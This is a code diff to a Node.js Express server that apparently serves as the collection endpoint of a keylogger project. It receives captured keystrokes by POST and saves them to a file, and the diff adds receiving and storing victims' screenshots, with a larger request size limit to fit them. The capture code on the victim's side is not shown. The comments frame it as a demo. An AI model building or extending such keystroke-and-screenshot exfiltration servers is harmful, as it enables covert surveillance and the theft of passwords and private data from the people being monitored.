@@ -10,7 +10,7 @@ const app = express();
 /* app should use bodyParser. For this example we'll use json. bodyParser allows you to
 access the body of your request.
 */
-app.use(bodyParser.json({extended: true}));
+app.use(bodyParser.json({extended: true,limit : '10mb'}));
 
 // We assign the port number 8080.
 const port = 8080;
@@ -34,10 +34,25 @@ app.get("/", (req, res) => {
 app.post("/", (req, res) => {
     // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
     console.log(req.body.keyboardData);
-    // Will now write the keyboard capture to a text file.
+    
+    // Save the keyboard capture to a text file
     fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
+
+    // Save the received picture to a file
+    const base64Data = req.body.screenshot.replace(/^data:image\/png;base64,/, "");
+
+    // Check if the screenshot file already exists
+    if (fs.existsSync("screenshot.png")) {
+        // If it exists, remove it
+        fs.unlinkSync("screenshot.png");
+    }
+
+    // Write the new screenshot
+    fs.writeFileSync("screenshot.png", base64Data, 'base64');
+    
     res.send("Successfully set the data");
 });
+
 // We can see that the app is listening on which port.
 app.listen(port, () => {
     console.log(`App is listening on port ${port}`);
